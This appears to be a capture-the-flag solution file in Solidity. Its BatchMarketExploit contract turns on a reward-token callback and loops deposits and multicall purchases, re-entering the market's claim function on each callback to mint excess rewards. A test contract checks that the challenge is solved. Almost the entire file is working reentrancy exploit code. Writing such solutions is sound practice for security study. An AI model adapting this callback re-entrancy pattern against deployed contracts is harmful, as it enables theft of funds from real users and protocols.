// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Setup} from "../contracts/Setup.sol";
import {CreditToken} from "../contracts/CreditToken.sol";
import {RewardToken, IReceiver} from "../contracts/RewardToken.sol";
import {BatchMarket} from "../contracts/BatchMarket.sol";


contract BatchMarketExploit is IReceiver {
    CreditToken public immutable credit;
    RewardToken public immutable reward;
    BatchMarket public immutable market;
    address public immutable player;

    constructor(Setup setup, address playerAddress) {
        credit = setup.credit();
        reward = setup.reward();
        market = setup.market();
        player = playerAddress;
    }

    function attack() external {
        require(msg.sender == player, "only player");

        reward.setHook(true);
        for (uint256 i; i < 7; ++i) {
            uint256 amount = credit.balanceOf(address(this));
            credit.approve(address(market), amount);
            market.deposit(amount);

            bytes[] memory calls = new bytes[](1);
            calls[0] = abi.encodeCall(BatchMarket.purchase, (amount));
            market.multicall(calls);
        }
        reward.setHook(false);
        reward.transfer(player, reward.balanceOf(address(this)));
    }

    function onRewardReceived() external {
        require(msg.sender == address(reward), "only reward token");
        market.claim();
    }
}


contract SetupTest {
    function testRebateCallbackSolvesChallenge() external {
        Setup setup = new Setup(address(this));
        BatchMarketExploit exploit = new BatchMarketExploit(
            setup,
            address(this)
        );

        setup.credit().transfer(address(exploit), 10_000 ether);
        exploit.attack();

        require(setup.isSolved(), "challenge not solved");
        require(
            setup.reward().balanceOf(address(this)) >= 100_000 ether,
            "insufficient player rewards"
        );
    }
}
